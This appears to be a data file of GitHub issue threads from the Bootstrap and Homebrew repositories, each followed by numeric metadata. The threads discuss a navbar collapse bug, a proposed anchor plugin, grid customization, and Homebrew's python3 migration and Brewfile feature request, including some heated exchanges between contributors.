found some  class related to our problem remembering that we have a trick to change  class to  and it works for me, so i'm interested with @friend (min-width 768px) block rules. Since the  class is our savior, I copied the rules and paste it on  rules. The result's look like this.. With this trick, the default Navbar is working perfectly when we enlarge our browser but we'll get a dropdown opened. I think that's not a big deal since our navbar is back to normal. Hope this trick can solve the problem once again. Please make sure you backed up your file first before trying this trick or you can use another css file to override the rules..  Everyone concerned about this should get a group of non-developer friends and do not tell them anything is ""wrong"" and see if they discover this. No regular user does this. If a user wants a window out of the way they click minimize. Most users slightly size down pages but if they do, they're not likely to size it down to see the mobile menu then click the toggle in the menu, pause and not click a link in the menu, but instead decide to re-size their page back up again. If it happens between flipping orientations, that's where the problem arises. That is a natural thing to do, even by accident, to click something in a menu, and then flip the device to landscape.  Yup, that's it. 2013/11/25 carasmo notifications@friend.com --  Zlatan Vasović - ZDroid  @friend Thanks. This works for me. I haven't noticed any side effects as yet, have you? An easy confusion in talking about this is that the navbar has a drop down menu in it. Then, when you shrink the window, the navbar itself becomes a drop down. You don't have to drop the drop down inside the dropped down navbar for this problem to happen. If you do, when you re enlarge the scroll bar is there already. With your fix, if you drop the inside drop down while in a shrunken window, it's still dropped when you re enlarge. I don't think that's a problem. If you were looking at it in the shrunken window, it's not a surprise when you re enlarge. I'm very happy with this now. I hope the developers will be too and that there are no side effects.  @friend I disagree. I don't think you should make too many assumptions about ""regular"" users. It's clearly a bug and as such should be fixed, just in case. Let's say you're copying information from one window into another open app where a simple cut and paste is not an option and want these two views side by side. Sometimes shrinking both windows is the only option. And even if the majority of examples where a user was doing something like that might be able to be done another way without shrinking windows - we can't go around and reeducate them on an individual basis. And most people that get upset about stuff like that, don't complain and just go away. I don't want that happening on my web sites.  If only we could make open source projects from a user-centered design perspective.  Won't change my mind. Shrinking both menus side by side and then copying pasting are different than deciding to toggle a menu and not click a link in that menu but then decide to just resize the page. Most people will refresh their browser if they happened to do that and discover that things have gone wonky. Hopefully this responsive crap will go away and all media queries will be min-device-width. I've done small menus where it doesn't even kick in unless that user comes to that site at the break point, not a single client says anything because the check their phone, works fine, check their desktop and tablet and it works fine. Just tell 'em it's adaptive, not responsive and move on.  If you feel that way about responsive design why are you contributing to a responsive framework?  I think I am misunderstanding what the purpose of participating in the project is.  I thought it was to help build a better bootstrap, but after a day of auditing these issues it seems like it is more about reddit style bickering over opinions that really aren't germane to the issues.  @friend Exactly. You've cut straight to the chase.  BS3 has the BEST grid system ever and the author's are geniuses. That is why. This stuff that regular users will not discover is simply not something that's important at all and after a month of seeing this thread, I just had to say something. I agree with the the test case being too aggressive. It's illogical. If it were a big deal or even a bug IMO, this thread would have more than 9 followers with 2 of them being team members. There would be a lot of plus ones.  Man I really don't get it.  I think I'll choose another project to contribute to.  It is indeed an edge case, but one that seems fixable and one that IMHO ought to get fixed.  @friend Why would you do that in response to one individual's opinion? The project itself is a worthy one. @friend I've been supporting various levels of computer user in a variety of contexts over many years and your supposition that a regular user wouldn't stumble on this flaw is just plain wrong. Many regular computer users get very quickly frustrated when software doesn't work as expected and generally being non technical, use software in ways that technical creators often won't appreciate. I may not be a regular user but I only just discovered bootstrap yesterday and this bug came up within a very short time of using it, I was simply checking that it was doing what it claimed to be doing. @friend I agree it's not a major bug but I, like Stephen did not expect to find myself having this discussion here.  I picked 20 issues and read through the threads, started doing research to come up with my first fork.  I'm seeing this attitude across this entire repo.  I really, really like bootstrap and want to contribute, but maybe the popular repos are attracting the wrong crowd?  I don't know, I'm new to this so I think I'll be safer with a smaller project for my first go.  Out of curiosity are @friend and @friend contributors? There have been quite a few people interested in this issue. An initial problem was that this interest was spread out over 5 duplicated issues.  Yes, I'm on the core team  has submitted a number of pull requests and legitimate bug reports.  Firstly, I should mention that the OP issue occurs in both static and fixed navbars. A related issue that I'm not yet clear about is that the fixed navbar in collapsed form does not push content down when you drop it. Is that intended? Is it too hard to do otherwise because of its fixed state? Ideally I would like a top of the window navbar that stays fixed and visible at the top but pushes content down when you drop it in its collapsed state.  @friend Intended AFAIK. I think it's just the design choice that was made. I don't know if the alternative you're proposing was ever considered.  I found a reason of bug. When you open a dropdown, resize window, uncollapse navbar, open dropdown and resize window again you'll get a  on . When remove that dummy  attribute you'll be able to see dropdown, again.  I have spent many hours trying to figure out what is happening here, and I'm not on the core team, so it is definitely not a completely obscure thing that is unlikely to happen to real people. Hope it gets fixed in a future release.  @friend If I found a real way to implement this fix, I'll send a pull request. )  Thank you @friend. I got a workaround on StackOverflow (with link to this thread), but I wish I did not have to spend so many hours trying to figure out what was going on. Hope it will help others, too.  Closing for #11653. ",47,16,405,0,0,221,10,
twbs/bootstrap/16248,0.36949757,twbs,bootstrap,Bootstrap Anchor plugin,17929,252,203,0,4,"Hello all. I'd first like to preface this with a little about myself. I am the primary maintainer for the Drupal Bootstrap base-theme. It currently has over 60k installs, so needless to say we get a lot of our own issues. Recently, I started the task of trying to tackle better anchor and scrolling support in the base-theme. Support for anchors or scrolling to them has always been a big pain, for not only me, but also a lot of others; especially when dealing with fixed navbars [jsbin]. The code I currently have in the project was rather hack-ish and completely un-configurable (my feeble attempt to satisfy a growing issue), so I set out to tackle this once and for all [ I've poured over countless blogs, docs, support forums and even found a few in this project's issue queue [#193, #1768, #11854]. The ""solutions"" vary from CSS to JS, but more often than not require at least some sort of manual configuration for it to work with that specific theme/offset requirement. Ultimately though, I've determined that a CSS-only solution just doesn't really cut it; especially when dealing with dynamic and varying content as such in CMS framework like Drupal. So, I've created the following JS based plugin instead  [demo/docs] In an effort to offset the ""cost"" for using JS, I was also inspired with the recent addition using anchor.js for Bootstrap's own documentation (#14897, #15491). This got me to thinking how this could easily be expanded from Bootstrap's own Tooltip plugin, like Popovers are. What makes it even more enticing is that there has been a  available to use for quite a while. Since both Tooltips and Popovers are completely opt-in with no data API support, it made sense to follow in that direction; especially for those who still want/need a CSS-only solution. My ultimate goal/desire is to merge this upstream into Bootstrap directly. I'm sure this will be a daunting task which is why I'm creating this issue now to get some feedback and eyes on this plugin so it can be flushed out a bit more. I'm still working on documentation of all the new options, so bare that in mind. I look forward to y'alls feedback!  Hi @friend! You appear to have posted a live example ( which is always a good first step. However, according to the HTML5 validator, your example has some validation errors, which might potentially be causing your issue  line 99, column 23 A  meta ♠` element found after the first 512 bytes.  You'll need to fix these errors and post a revised example before we can proceed further. Thanks! (Please note that this is a fully automated comment.)  I personally doubt the Core Team would be interested in getting into the same business as Anchor.js when Anchor.js itself already does a fine job. As for #1768 &amp; friends, you might have more traction on that front, although we're fairly reluctant to add more jQuery plugins at this point. I too wish there was a good solution to that bug though.  Except that Anchor.js isn't bundled with Bootstrap. This is about providing and out-of-the-box native Bootstrap plugin... not relying on yet another 3rd party external library that people will have to download, install and configure in addition to. That's certainly debatable. It's lightweight and works well for simple sites, sure, but also at the cost of being easily configurable in case complexities arise. It doesn't use a template for inserting existing markup that a framework (like Bootstrap) already has available and the only way to replace the ""icon"" is to override/replace the CSS it provides. It's ID generation logic could also use some work. I'm really not trying to knock it, in fact it was in part responsible for the discovery process that led to this plugin. It certainly has it's use cases, but I wouldn't have built what I did if it did a ""good"" enough job. I would like to make it clear that this plugin is a pure extension on top of the existing Bootstrap tooltip plugin. It is and was not an Anchor.js rip-off, just inspired by it as well as Bootstrap's existing Tooltip plugin. I think you're missing the point of the plugin. It's goal is to really tie two concepts together anchors and links to anchors (anchor links). By doing so, they're aware of each other and can work together in harmony to provide a more cohesive anchor/scrolling solution. Sure. I'm not suggesting that this should be in the next release. It's currently not, by any means, ""production"" ready. In fact, I imagined that it would be BS4 in all reality (with the separate repo for BS3 support/prototyping). Like I said above, I opened this issue for exposure and to get viable feedback. I was hoping to have more of a positive feedback and to move forward rather than defending a solution to a problem that has been quite evident for quite some time now. I'm certainly open to suggestions, improvements and even changing some fundamental aspects about the plugin, it's not set in stone. I urge people to seriously consider this proposal rather than simply dismissing it outright because of ""simpler"" existing plugins.  Just speaking generally There is a limit to what we can bundle, both due to the amount of effort required (e.g. I'm doubtful that Bootstrap itself will ever include a datepicker; they're just too damn complex and we already have our work cut out for us just maintaining the existing widgets) and due to fears of bloat (which we're already occasionally accused of with just our current set of widgets). And the trend these days is towards smaller modular packages rather than kitchen sinks. Actually, one of the hopes for Bootstrap v3 was to strengthen the third-party plugin ecosystem and thus lessen the pressure for new plugins in core Bootstrap, but unfortunately not much happened on that front. Anyway, I'll be interested to see what the rest of the team says about the proposal.  I'm rather curious as to the hesitation. Have you even looked at the code and demo yet? I've already done most of the ground work...  agree, but this isn't about just adding a arbitrary feature, it's also a solution to an issue that this framework introduces in the first place by providing a fixed navbar. It's kind of like saying ""Here's a nifty feature for navigation, but don't mind that your anchors may behave a bit oddly at times. Will we fix it, no... there's a few hacks around the interwebs, do some research."" I will gladly accept sole responsibility for maintaining this specific plugin it if it were ever to come to that. Somehow though, I doubt that will happen considering it's already built upon and in the same format as the Tooltip plugin. Yes, I would be too.  @friend A few things It's interesting to me that you get a lot of requests for the feature in your Drupal theme. Forgive me, but it's been quite some time since I touched PHP or any CMS but is that a common sort of feature in Drupal themes? I haven't seen it come up too often in Bootstrap's IRC channel or elsewhere, so it's interesting to me that it'd be a requested feature elsewhere. I'd also be interested if it's the sort of plugin other theme developers might want to use. Secondly, this is a bit unfair The docs note that using fixed navbars requires some padding adjustments. While that doesn't cover every combination of components and HTML on a page (a fixed navbar and anchors to IDs in this specific instance). Solving that problem is usually done simply with an offset on the click. Bootstrap-anchor does much more than solve that one issue, though, which brings me to my third thing. Adding features, especially full-fledged plugins, need to be evaluated in terms of long-term maintenance costs (it's great that you're offering to support it, but it's also no guarantee, unfortunately), added complexity (you'll be surprised by how authors use Bootstrap in unexpected ways) and package costs (like @friend pointed out, Bootstrap already gets flack for being heavy in many ways). Anyway, I'm not saying -1 yet but I'm not sold yet on why this should be a core plugin and not a community plugin.  I wouldn't say it's ""common"" per se, but it certainly more of a prevalent issue when Drupal modules like the Administration Menu add their own fixed nav and increases the  margin (not padding) on top of a user who has opted to use the Bootstrap fixed navbar that adds  padding; it can get rather complicated and nasty very quickly. I think that's because people who are in the business of starting with Bootstrap directly (i.e. reading the docs, in the IRC channel) are generally themers/site builders or at the very least able to understand that there will be a minimal amount of effort in configuring their ""theme"". The Drupal Bootstrap base-theme's sole purpose is to bridge that gap between the dynamic aspect of Drupal and the Bootstrap framework. One of the main reasons this base-theme has risen to become very popular (currently third top Drupal theme) in such a short amount of time is because it allows non-themers to configure their Bootstrap theme in an easy to use administrative UI. I understand that I come from a unique perspective and it's partially a unique issue to us. Users choose Drupal Bootstrap because the framework is popular. The don't always choose it because they know the little intricacies/issues that come with choosing their fixed navbar type from the UI  These types of users are not always skilled CSS/JS ninjas, so when they see that there's an issue with their anchor's ""Solving that problem is usually done simply with an offset on the click"" is really not always as ""simple"" as it sounds. Which is why I've been working on a way to assist with/fix this problem. Yes, I understand and acknowledged this fact up front as one of the reasons for offsetting the ""cost"" of using a JS based solution to the scrolling issue by expanding upon Bootstrap's Tooltip plugin with anchor links. Also, again, it goes further than just ""adding in another feature"" really. The two work in together in harmony. By building the plugin with the concept of ""anchors"" and ""anchor links"", it allows for a more cohesive UX in addressing ""What happens when I click an anchor on this page?"". I do find it a little ironic though that even the docs suddenly had a need for them, but there wasn't anything native in Bootstrap to do it so a third party plugin was used instead. I really do understand all of this and agree with it, believe me, I do. I'm not suggesting this plugin is just thrown in willy nilly without any sort of evaluation, game plan or what have you. I think the real purpose of why I opened this issue in the first place is really being lost here. I'm not saying it can't be either. I opened this issue to get evaluation and feedback on the plugin itself, not quarrel over semantics. Yes, I said it was my goal/desire to ultimately make this a core plugin, but who knows, maybe that won't be the case and I'll just keep it as a separate contrib plugin. That is certainly fine by me. All I was looking for really was ""Wow that's cool... let's work on making it better! Maybe it's something that does have merit to pull into core.""... you know FOSS, not getting smacked down for having an idea on how to fix a very real issue. I'm honestly half tempted to just close this issue and just continue developing it as a contrib plugin if this is going to be the attitude moving forward frowning  Your plugin looks and feels awesome in my super quick tests, so props on that front. I'll try to address as much of your post and the replies here as I can. Development approach Tooltips and popovers are opt-in do to performance issues with detecting , , etc on every DOM element. Good call here, that does indeed make sense. Your goal and feedback Right on, a bold endeavor to say the least ). I think @friend, as a core team member, covered the generalities quite well, though I think you've mistaken some of his comments as overly dismissive. He's outlined that  We're reluctant to add new JavaScript. Expanding on that, we're not adding any new features to v3. It's a call we made to avoid having to rewrite even more for v4. We've got Anchor.js in there right now and it's solving the problem it was meant to solve—linking to specific sections of content—quite well. There's a balance to what we can do with the size of the team we have. We build things we think folks would like to use, as well as things we ourselves want to build and maintain.  You didn't get any real feedback on your own plugin, but that's not really something we're here to provide unfortunately. At least, not in a structured or timely way that would be of much use to yourself. Looking at the demo and docs though, it seems to work quite well and is a decently structured and focused plugin. All around, it seems great. Fixed navbars Yes, we've got fixed navbars and yes there's the problem of overlapping content. I'd prefer we didn't add more JavaScript to address that, but I understand folks also don't want to have to address these kind of things themselves. I'm torn on how far to go there, and because of that, we likely won't try to address it ourselves. I'd like us to continue to err on the side of caution for this kind of stuff. Maintenance You've offered to maintain it, but that's not enough. Putting it in the main repo means committing to it and supporting it as a team. Bug reports, further feature development, and documentation all come into play there. I'm not saying you wouldn't be up to it, but we might not be. That's not meant to be dick-ish, it's just matter-of-fact. On feedback No one has smacked you down. One team contributor and one community member voiced their opinions. Their questions and comments are just as valid as your own. While you've very clearly asked for feedback, you also very clearly stated you'd like this to be part of the core project. Two folks have focused on the latter while reviewing this thread.  Lastly, shifting gears back to the plugin itself, it's a damned fine plugin. I'd like to see it continue as a community project as I don't think it's something we'd like to see addressed with Bootstrap. Yes, the fixed navbar introduces a potential need for this. However, that's not unique to our navbars—damned near every component likely introduces a potential need for n number of edge cases, extensions, etc. Please do continue to develop and share it with folks, but it won't be part of Bootstrap's core (not in v3 or v4, not at this point at least). Please also continue to use this thread to gather feedback from folks if you wish. I'd love if more of our team chimed in, but we're all on different schedules and what not. Hope that helps some. &lt;3  Your plugin looks and feels awesome in my super quick tests, so props on that front. I'll try to address as much of your post and the replies here as I can. Development approach Tooltips and popovers are opt-in do to performance issues with detecting , , etc on every DOM element. Good call here, that does indeed make sense. Your goal and feedback Right on, a bold endeavor to say the least ). I think @friend, as a core team member, covered the generalities quite well, though I think you've mistaken some of his comments as overly dismissive. He's outlined that  We're reluctant to add new JavaScript. Expanding on that, we're not adding any new features to v3. It's a call we made to avoid having to rewrite even more for v4. We've got Anchor.js in there right now and it's solving the problem it was meant to solve—linking to specific sections of content—quite well. There's a balance to what we can do with the size of the team we have. We build things we think folks would like to use, as well as things we ourselves want to build and maintain.  You didn't get any real feedback on your own plugin, but that's not really something we're here to provide unfortunately. At least, not in a structured or timely way that would be of much use to yourself. Looking at the demo and docs though, it seems to work quite well and is a decently structured and focused plugin. All around, it seems great. Fixed navbars Yes, we've got fixed navbars and yes there's the problem of overlapping content. I'd prefer we didn't add more JavaScript to address that, but I understand folks also don't want to have to address these kind of things themselves. I'm torn on how far to go there, and because of that, we likely won't try to address it ourselves. I'd like us to continue to err on the side of caution for this kind of stuff. Maintenance You've offered to maintain it, but that's not enough. Putting it in the main repo means committing to it and supporting it as a team. Bug reports, further feature development, and documentation all come into play there. I'm not saying you wouldn't be up to it, but we might not be. That's not meant to be dick-ish, it's just matter-of-fact. On feedback No one has smacked you down. One team contributor and one community member voiced their opinions. Their questions and comments are just as valid as your own. While you've very clearly asked for feedback, you also very clearly stated you'd like this to be part of the core project. Two folks have focused on the latter while reviewing this thread.  Lastly, shifting gears back to the plugin itself, it's a damned fine plugin. I'd like to see it continue as a community project as I don't think it's something we'd like to see addressed with Bootstrap. Yes, the fixed navbar introduces a potential need for this. However, that's not unique to our navbars—damned near every component likely introduces a potential need for n number of edge cases, extensions, etc. Please do continue to develop and share it with folks, but it won't be part of Bootstrap's core (not in v3 or v4, not at this point at least). Please also continue to use this thread to gather feedback from folks if you wish. I'd love if more of our team chimed in, but we're all on different schedules and what not. Hope that helps some. &lt;3 ",65,24,630,0,0,364,7,
twbs/bootstrap/16338,0.06785716850000001,twbs,bootstrap,"Chrome userAgent styles for input[type=""date""] etc change display style to inline-flex",521,6,6,0,1,"I'm not familiar with this repository, and I can't ascertain the bootstrap attitude toward userAgent styles. Regardless, Chrome OSX 42.0.2311.90 changes the  style of html5 time elements. Is this something bootstrap should rein in or is it a  fix?  Probably don't need to do much here since we override much of those styles with  anyway. Thanks for the heads up though!  Interesting note Their  can't be totally overridden; their calculated  is always some kind of flex. Setting  just makes it compute to  (instead of ). ",3,0,19,0,0,14,2,
twbs/bootstrap/19814,0.10431067000000001,twbs,bootstrap,What happened to the navigation for smartphones?,786,9,5,0,1,"I began to migrate to the Bootstrap 4. All components are successfully updated, except for navigation. How does the navigation Bootstrap 3 for smartphones image How does the navigation Bootstrap 4 for smartphones image1 or image2 What caused such an attitude to navigation?  There is a large amount of work to be done on navs still... Alpha2 is not production ready so you'll have to live with issues as v4 matures  Well, I hope that this defect will be fixed.  @friend It's not a defect, it's a WIP. Please close this issue since it is a duplicate of  As @friend said, v4 is still in early alpha, and a lot of structures, styles and scripts have changed considerably/aren't finished yet - migrating to v4 already at this stage will likely bring up issues. And yes, duplicate of #17250 ",3,0,25,0,0,19,1,
twbs/bootstrap/7050,0.0672806925,twbs,bootstrap,"Popovers in 2.3.0, why would title text display but not the body text",1856,21,33,0,1,"Have tried the following and a couple of other iterations.  I have jquery.js (full being brought in.  Assume I don't need bootstrap-tooltips.js AND bootstrap-popover.js as well?  Regardless, the problem isn't solved when including them.  TIA.             &lt;a data-toggle=""popover"" class=""m-btn blue rnd"" data-title= ""We are in  awwwwww"" data-content=""dolor sit amet.""&gt;Click me!&lt;/a&gt;             &lt;script type=""text/javascript""&gt;                 $(function () {                     $('body').popover({                         selector 'a[rel=""popover""], [data-toggle=""popover""]'                     });                      $('body').tooltip({                         selector 'a[rel=""tooltip""], [data-toggle=""tooltip""]'                     });                 });             &lt;/script&gt;   This doesn't seem to be the right forum for this ? although issue is valid.  Moving to mailing list since patience wears thin on noob questions apparently.  this could be happening cause the tooltip / popover is in a btn-group or one of the input-append or input-prepend classes.. we can set a container option to help fix that problem.. `  Duplicate of #5930.  Thanks.  That was fixed in 2.3 (I found) and when i got jquery link code cleaned up a bit.  Now I just wrestling with keeping the popover open long enough to read and click on embedded hyperlinks within before manually shutting it down.  Best, V. On Thu, Mar 14, 2013 at 1236 PM, Chris Rebert notifications@friend.comwrote --  Vince Fulco, CFA, CAIA 612.424.5477 (universal) vfulco1@friend.com twitter vfulco app.net vfulco -- “Everything can be taken from a man but one thing the last of the human freedoms – to choose one’s attitude in any given set of circumstances, to choose one’s own way”.  --Viktor Frankel Always have your stuff when you need it with @friend. Sign up for free! ",3,6,160,0,0,44,4,
twbs/bootstrap/7745,0.3628087885,twbs,bootstrap,customize bootstrap results in 1 potentially wrong variable in media query,7842,81,121,0,0,"I was looking at the media query for (max-width 767px) in my custom bootstrap downloaded from the site, and I believe it has an error in it. I customized my bootstrap using the online customization to have 15 columns, which worked out great. Yet I believe this code is incorrect and should be referencing span15 in my case, or the largest span# in any custom bootstrap.css .span12, .row-fluid .span12 {     width 100%;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;   } Let me know if my assumption is true, as I don't immediately detect any difference in my layout by changing the 12 to 15.  If you post code on github use the appropriate markdown. Link is on the top right of the comment box. I am not working with 2.0 anymore but i can confirm this code is in the generated CSS I just downloaded to to look at. This should indeed output as  based on the custom span value used. I used 16 as a custom value everything else is generated as it should be but this part is fixed to 12 is seems. If the assumption is true this means if you use  this will break your layout. Like . span15 should also not have the optimal layout but there are very few cases people use the maximum span inside a row I guess since there is not really a point, that maybe for dynamic content. But if you use spans inside rows you should definitely see changes when your switch from 12 to 15. You should now have the space of 3 spans empty at the right of your rows.  I'm not sure what you're talking about with regard to proper markdown. It looks fine and readable to me...? I don't have any span 12s on my pages, but I bet you're right! I bet if I did, I'd be wondering why my layout is broken. Concerning your last paragraph, that's true. But what I'm saying is that changing .span12, .row-fluid .span12 { width 100%; -webkit-box-sizing border-box; -moz-box-sizing border-box; box-sizing border-box; } to .span15, .row-fluid .span15 { width 100%; -webkit-box-sizing border-box; -moz-box-sizing border-box; box-sizing border-box; } doesn't appear to do anything to my layout at sizes less than 767px. I don't see a difference at least. Should I?  Closing this out—the grid system is massively overhauled in v3 and everything does get .  @friend well your code is not indented what is probably caused by just copy pasting it and its not in monospace font so you not used the markdown for it. For this short parts of code not so big deal but you should just use it when posting on github. Look I think it's a bit harsh to just close it since it is a actual bug you discovered. The bug should be easy to find and fix. But on the other hand makes sense since in 3.0 things are handled so much better. And no once the spans are not floating you should not see a difference. So you do actually see one when 768+, thats what I meant. I suggest you dig a bit into it and learn what the grid actually does. You may dig down the source of this bug on the way. Or simply not use span12 and span15 in your case and you're good. I personally would only use even numbers for the grid btw since you can't 50/50 otherwise.  Thanks for the extra reply nextgenthemes! I was hoping you'd answer my question. ) For my client's website, the majority of their columns in the design I made are 3 and 5 column, and you can't do 5 centered columns in an even numbered grid that also can do 3 columns. You can only do 5 column in these grid column amounts 5, 10, 15, 20, and so on. You can do 3 column layouts in these column amounts 3, 6, 9, 12, 15, 18, 21. 15 was the best way for me, and the design has been working beautifully (and easily) ever since I switched to a custom 15 column grid. I'm glad the customize section of Bootstrap exists, otherwise I never would have been able to do all of the math, however, I must admit the math for the column and gutter sizes did take me a few hours of trial and error. If what I said above doesn't make sense to anybody who ends up reading this via a google search someday... The reason I used a 15 column grid is because... span5, span5, span5 = 3 column layout span 3, span 3, span 3, span 3, span 3 = 5 column layout What nextgenthemes says about not being able to do 50/50 using supplied CSS classes is true, however that is extremely easy to write custom CSS for. In fact, I am using custom CSS to do exactly that for something that I want to go from span5, span10 to 50/50 on screen sizes smaller than 767px (by default all spans collapse into 1 column at this size). Maybe this will help someone some day, so I'll go through the process. What I did was replace my span5 and span10 with spain5nocollapse and spain10nocollapse in the HTML file, then put this code into my custom CSS. /note you'll need to open your bootstrap-responsive or custom bootstrap.css and find the appropriate percentages for your site/ .row-fluid .spain10nocollapse {     width 65.29284164859001%; /see note above/     width 65.23861171366593%; /see note above/     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } .row-fluid .spain5nocollapse {     width 30.585683297180044%; /see note above/     width 30.531453362255967%; /see note above/     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } @friend (max-width 767px) { .row-fluid .spain10nocollapse {     width 50%;     width 50%;     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } .row-fluid .spain5nocollapse {     width 50%;     width 50%;     float left;     display block;     -webkit-box-sizing border-box;     -moz-box-sizing border-box;     box-sizing border-box;     min-height 30px;     margin-left 0px } } There's probably some extraneous code in there that isn't necessary, but I haven't gotten to the stage of my programming where I care about cleaning up redundancy. Hope that helps someone in the future. BTW, the reason I am using ""spain"" instead of ""span"" is because I didn't want any CSS that affects all classes with the name ""span"" to mess with these styles.  The format for two of those lines of code is wrong. They are supposed to be *width Guess I should have tried harder to find the way to input code on here, but I don't see any way of doing it...  Even after I told you you post huge chunks of code without proper formatting. Anyway this was about your bug report and I confirmed that bug! The issue is closed and this is not the place to get help for your personal stuff. Try stackoverflow or the BS IRC channel.  Thanks nextgenthemes, I'll follow your example and be a jerk who can't read code that isn't inserted in an inset gray box and post rude comments when someone tries to help others. Or maybe I should say it like this so you're unable to read it. .nextgenthemes { display jerk; readability none; response-mode uncalled-for; }  Keep the name-calling and attitude out of our issues, please. Folks are here to learn, get help, and report bugs. They're not here to see folks bicker among themselves—that doesn't help anyone. @friend He's referring to the ""GitHub Flavored Markdown"" link directly above the comment field on the right. Click that and it will show you how to use Markdown so you can take advantage of code syntax highlighting. Alternatively, have a look here. @friend I appreciate you trying to help, but please do your best to avoid the attitude in the future. You may not have even meant it, but I hope you can see how easy it is for folks to take it one way or the other. It's tough communicating via text like this—tone and context are easy to miss. ",34,0,389,0,0,133,5,
Homebrew/brew/3859,0.19054206,Homebrew,brew,brew update is destructive linking python3 to python,2717,19,13,0.5,2,"I just did ""brew update"" which did the following ==&gt; Migrating python3 to python ==&gt; Unlinking python3 ==&gt; Unlinking python ==&gt; Moving python3 children ==&gt; Linking python I'm sure that python3 makes sense to use and is the future, but why is this change made without  prompting the user for input? This is potentially a breaking change that can affect systems. Furthermore the semantics of running brew update is now blurred; what am I to expect when running the command?  This changed was announced in January  you need Python 2,  This changed was announced in January  you need Python 2,  Also please always, always read and fill out the issue template. It tells you to do so. No Homebrew change ever prompts the user for input.  Furthermore the semantics of running brew update is now blurred; what am I to expect when running the command? I'd love to know the answer to this as well. How should a user guard against unexpected breaking changes? And once broken, how should users proceed and get back to getting work done?  In progressing levels of effort (the lowest level of which would have been sufficient in this case)  read our blog posts through the RSS feed or our Twitter feed (or the front page of Hacker News where they normally end up) watch our repository and read pull requests that seem relevant to your organisation watch our repository and test pull requests that seem relevant to your organisation before they are merged create your own tap or fork of Homebrew/homebrew-core for formulae you wish to never be changed  That's on you to figure out. We're volunteers running a project that you're using to ""get work done"" i.e. make money. Our license clearly states we disclaim all warranties and the software is available as-is. Note, your organisation could consider donating money to our project which would provide more resources to make it easier for us to do additional automated testing.  And to be clear This is definitely a breaking change. That's why we gave you a month and a half's notice on our primary communication mechanisms (blog on our homepage, our Twitter) to adapt to this change. If you did not do so that's on you, not us, sorry.  @friend Would you like to explain your 👎 or would you like to just demotivate the maintainers to this project through drive-by negativity?  I think you are coming off angry and arrogant in your replies to this.  I think this is an issue that should be handled, and the users helped, with less arrogance and negativity from your side as well.  I see no mention of breaking changes or remediation steps in that blog post. If said blog is the only communication mechanism for breaking changes, that failure to communicate is on you. ",10,5,81,0.4,0.1,47,6,
Homebrew/brew/3933,0.085121596,Homebrew,brew,Automatically maintain ~/.Brewfile,5531,61,36,0.6666666666666666,2,"In the past, multiple people have requested that some kind of hooks functionality be added to Homebrew. This would unnecessarily complicate Homebrew in my opinion, but the rationale behind those requests has not been given adequate consideration IMO. Rather than a generic hooks system, I would like to propose that Homebrew maintains ~/.Brewfile and keeps it up to date whenever new taps, formula, or casks are installed. This is the primary reason for all of the previous hooks requests, and I think it's a pretty legitimate one. This would allow anyone tracking their dotfiles in version control to simply add ~/.Brewfile and commit it whenever it changes. Currently, the process to do this is a bit annoying, because after every brew command, I need to manually run . It works, but it's a kludge. I'm not sure that this is relevant to 90% of Homebrew users, but it also doesn't harm anyone that doesn't want the functionality. They can simply ignore the file. I would also argue that anyone that currently has this file in place is probably already manually running the aforementioned command manually, and would be grateful for the automation. I'm happy to implement this if a PR would be welcomed.  Homebrew has historically (and correctly in my opinion) never written any dotfiles. As you mention this is still possible with some manual work that I think is more desirable and could be wrapped with a script or function that calls  after each  run. Sorry but thanks.  I am not the first to suggest this, nor will I be the last. I really don't understand your rationale here, but would you be open to an opt-in approach via an environment variable or something? It's extremely unlikely that I'm going to write a script that wraps all of the brew commands and run  after some of them when it's a problem that could be very trivially solved in Homebrew itself.  Can you link to the other suggestions? Thanks! That's up to you.  Solving this in HB itself is less trivial than the alternative ♠ newbrew() {   brew ${@}   brew bundle dump --file=~/.Brewfile --force }  I found these four very quickly. Hard to track them down because of the repository changes, but note that you (@friend) mentioned in  that it had been requested a few times before, so this can't be news to you.   if you want to do it correctly. It's not necessary to dump the Brewfile after  for instance. Personally, I would rather not incur the 2 second penalty on every brew command. Yes, this can be solved outside of Homebrew, but why should it not be Homebrew's issue? It's a point of friction that can be solved with zero negative consequences.  Also trivial  Because it does not pass the “relevant to 90% of users” barrier. Adding a feature does not just mean writing the code. It means maintaining it (code) and supporting it (issues); dealing with every other thing that breaks because of it; and considering when weighing other features that may clash with it (even if in usability).  Yeah, I'm aware. I maintain a widely used project as well. IMO, it still doesn't make sense to make each individual user that is affected by this problem solve it individually, even if the method for doing so is easy.  It does make sense in the case where it's relatively easy to do so, users cannot currently agree on how this should behave and we have a very low number of requests proportional to Homebrew (or even s) users.  Another option have launchd run brew bundle dump for you once an hour and forget about this forever.  TIL kludgy workarounds are an acceptable substitute for 20 lines of well tested, widely used code. I seriously cannot understand that mindset. You have refused to add ways for users to extend Homebrew, and you have refused to add specific functionality that users would add in third party extensions if they were able. You have essentially mandated that kludgy workarounds are the only way to get this functionality, and that's really not a great situation. If that's the barrier, then reopen this issue and let users discuss it. Tweet it out and ask for feedback. People aren't going to see/engage with it if it's closed. I would argue that literally anyone using brew bundle would benefit from this feature, even if they haven't explicitly requested it.  @friend Please read, or re-read, our Code of Conduct and adjust your future communication accordingly.  Wrapping a Unix tool with a Unix shell script is an acceptable substitute for an unknown quantity or quality of unwritten code that would be used by a minority of Homebrew's users. Untrue. Users can use and build external commands which can be shared in taps (along with formulae). That's not how we run our issue tracker, run yours how you choose. I use, have contributed more to it than anyone else and have maintained longer than anyone else both this repo and Homebrew/homebrew-bundle. I've also rolled out Homebrew/homebrew-bundle to hundreds of developers in an organisation who use it daily and built tools on top of it used by many other organisations. I would not use this feature and most of the aforementioned folks would not either. Finally, I wish I'd listened to my gut earlier and, like @friend has done, pointed you to our Code of Conduct. Unfortunately you seem unable to conduct yourself in a polite fashion so I'm uninterested in continuing this conversation. I hope that we're able to work together on a PR or issue in future but please note that continued violations of our Code of Conduct will result you being blocked from the Homebrew organisation. ",31,15,168,0,0.3333333333333333,104,4,
